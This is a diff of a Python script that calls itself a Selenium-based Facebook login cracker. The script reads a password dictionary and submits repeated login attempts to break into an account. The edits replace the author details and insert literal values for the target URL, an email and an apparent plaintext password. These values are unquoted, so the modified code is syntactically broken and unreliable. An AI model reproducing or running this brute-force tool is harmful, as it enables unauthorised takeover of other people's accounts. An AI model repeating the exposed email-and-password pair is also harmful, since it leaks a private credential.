@@ -2,8 +2,8 @@
  (L) Lithium V.01 : A simple selenium based facebook login cracker.
 
  Written By : Tanmay Upadhyay
- Email : kevinthemetnik@gmail.com
- facebook : (fb.com/tanmayupadhyay91)
+ Email : silsheyrar@gmail.com
+ facebook : (https://www.facebook.com/profile.php?id=61562850255556&mibextid=ZbWKwL)
 
  (I will try to provide threading and proxy support in upcomming versions of lithium, (help is appreciated).)
 
@@ -46,7 +46,7 @@ class Lithium:
 		self.option.add_argument('disable-extentions')
 	def Inject(self):
 		self.browser=webdriver.Chrome(self.chromedriver, options=self.option)
-		self.browser.get("https://mbasic.facebook.com") #basic html version of facebook is alot faster.
+		self.browser.get(https://www.facebook.com/profile.php?id=61562850255556&mibextid=ZbWKwL) #basic html version of facebook is alot faster.
 		try:
 			with open(self.dictionaryfile,"r+") as dictionaryfile:
 				self.passwords=dictionaryfile.readlines()
@@ -56,8 +56,8 @@ class Lithium:
 					self.browser.find_element_by_name("email").clear()
 					username_element = self.browser.find_element_by_name("email")
 					password_element = self.browser.find_element_by_name("pass")
-					username_element.send_keys(self.username)
-					password_element.send_keys(self.password)
+					username_element.send_keys(silsheyrar@gmail.com)
+					password_element.send_keys(RamosJesus01)
 					login_button = self.browser.find_element_by_name('login')
 					login_button.submit()
 					if("save" in self.browser.current_url or "?_rdr" in self.browser.current_url):
